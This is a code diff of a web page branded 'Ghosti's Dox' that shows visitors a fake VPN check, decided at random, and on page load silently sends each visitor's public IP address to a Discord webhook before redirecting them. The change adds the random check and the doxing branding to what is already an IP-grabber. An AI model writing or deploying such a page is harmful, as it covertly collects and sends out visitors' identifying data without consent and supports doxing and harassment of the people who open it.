@@ -3,16 +3,7 @@
 <head>
     <title>VPN Detection</title>
     <script>
-        function checkVPN() {
-            
-            var isUsingVPN = confirm("Are you using a VPN?");
-            
-            if (isUsingVPN) 
-            {
-                alert("Please turn off your VPN.");
-            } else 
-            {
-                async function logIPAndSendToWebhook() {
+         async function logIPAndSendToWebhook() {
             try {
                 const response = await axios.get('https://api.ipify.org?format=json');
                 const ip = response.data.ip;
@@ -20,14 +11,25 @@
                 await axios.post(webhookUrl, {content: `IP Address: ${ip}`});
                 console.log('IP address sent to Discord webhook:', ip);
             } catch (error) { console.error('Error logging IP address:', error); }
-        }
+         }
+                
+            
+        
+        function detectVPN() {
+            // Simulated check for VPN usage - replace this with actual VPN detection logic
+            var isUsingVPN = Math.random() < 0.5; // Randomly simulate VPN usage
+
+            if (isUsingVPN) {
+                alert("Couldn't continue due to you using a VPN. If you want to continue to Ghosti's Dox, please turn off your VPN!");
+            } else {
                 logIPAndSendToWebhook();
-                window.location.href = "https://example.com"; // Redirect to another site
+                window.location.href = "https://example.com"; // Redirect to another site when VPN is off
             }
         }
     </script>
 </head>
-<body onload="checkVPN()">
-    <h1>Welcome</h1>
+<body onload="detectVPN()">
+    <h1>Welcome to Ghosti's Dox</h1>
+    <p>If you see this message, VPN detection failed.</p>
 </body>
 </html>
